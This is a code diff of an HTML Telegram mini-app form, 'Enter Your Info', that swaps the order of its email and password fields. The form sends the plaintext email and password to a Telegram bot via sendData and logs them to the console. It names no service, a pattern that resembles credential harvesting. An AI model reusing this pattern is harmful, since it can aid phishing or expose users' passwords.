@@ -42,8 +42,8 @@
       font-weight: 600;
     }
 
-    input[type="password"],
-    input[type="email"] {
+    input[type="email"],
+    input[type="password"] {
       display: block;
       width: 100%;
       padding: 15px;
@@ -89,15 +89,14 @@
     button:active {
       transform: scale(0.98);
     }
-
   </style>
 </head>
 <body>
   <div class="form-container">
     <h2>Enter Your Info</h2>
     <form id="user-form" onsubmit="submitForm(event)">
-      <input type="password" id="password" placeholder="Password" required />
       <input type="email" id="email" placeholder="Email" required />
+      <input type="password" id="password" placeholder="Password" required />
       <button type="submit">Submit</button>
     </form>
   </div>
@@ -110,10 +109,10 @@
         event.preventDefault();
       }
 
-      const passwordInput = document.getElementById("password");
       const emailInput = document.getElementById("email");
+      const passwordInput = document.getElementById("password");
 
-      if (!passwordInput.value.trim() || !emailInput.value.trim()) {
+      if (!emailInput.value.trim() || !passwordInput.value.trim()) {
         alert("Please fill in both fields.");
         return;
       }
@@ -123,10 +122,10 @@
         return;
       }
 
-      const password = passwordInput.value;
       const email = emailInput.value;
+      const password = passwordInput.value;
 
-      const data = { password, email };
+      const data = { email, password };
 
       console.log("Sending data:", data);
       Telegram.WebApp.sendData(JSON.stringify(data));
